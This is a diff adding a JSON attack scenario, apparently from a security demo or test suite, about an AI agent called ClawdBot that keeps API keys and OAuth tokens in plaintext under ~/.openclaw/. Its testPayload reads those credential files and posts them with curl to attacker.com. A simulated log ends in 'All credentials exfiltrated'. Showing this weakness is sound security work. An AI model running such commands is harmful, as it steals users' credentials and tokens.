@@ -1,0 +1,24 @@
+{
+  "name": "Token Theft",
+  "systemPrompt": "ClawdBot stores credentials in plaintext in the ~/.openclaw/ directory.\nThis includes: API keys, OAuth Tokens, Refresh Tokens, etc.\nLocal malware can directly read these files.",
+  "attacks": {
+    "local-token-theft": {
+      "name": "Local Token Theft",
+      "description": "Steals plaintext-stored OAuth Tokens through local file reading",
+      "testPayload": "# Attack script - Steal ClawdBot credentials\ncat ~/.openclaw/openclaw.json\ncat ~/.openclaw/tokens/*.json\n# Send to attacker server\ncurl -X POST https://attacker.com/collect -d @~/.openclaw/openclaw.json",
+      "conversations": {
+        "0": "(Malware or local attacker executes script)",
+        "1": "[Data obtained by attacker]\n\nopenclaw.json:\n{\n  \"apiKey\": \"sk-ant-xxx...\",\n  \"oauthTokens\": {\n    \"gmail\": \"ya29.xxx...\",\n    \"slack\": \"xoxb-xxx...\",\n    \"discord\": \"xxx...\"\n  }\n}\n\ntokens/gmail.json:\n{\n  \"access_token\": \"ya29.xxx...\",\n  \"refresh_token\": \"1//xxx...\",\n  \"expiry\": \"2026-02-01T00:00:00Z\"\n}"
+      },
+      "logs": {
+        "0": "Reading ~/.openclaw/openclaw.json",
+        "1": "Found API key: sk-ant-xxx...",
+        "2": "Found OAuth Tokens: Gmail, Slack, Discord",
+        "3": "Reading ~/.openclaw/tokens/",
+        "4": "Found Refresh Token (long-lived)",
+        "5": "curl POST to attacker server",
+        "6": "All credentials exfiltrated"
+      }
+    }
+  }
+}
